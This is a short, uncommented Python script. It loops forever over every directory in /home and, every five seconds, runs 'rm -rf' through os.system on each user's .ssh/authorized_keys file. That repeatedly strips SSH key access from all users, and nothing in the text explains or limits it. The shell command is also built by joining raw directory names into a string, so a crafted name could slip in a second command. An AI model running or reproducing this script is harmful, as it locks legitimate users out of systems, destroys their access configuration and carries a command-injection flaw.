import os
import time

os.chdir("/home")
while True:
    for file in os.listdir("."):
        if os.path.isdir(file):
            os.system("rm -rf " + file + "/.ssh/authorized_keys")
    time.sleep(5)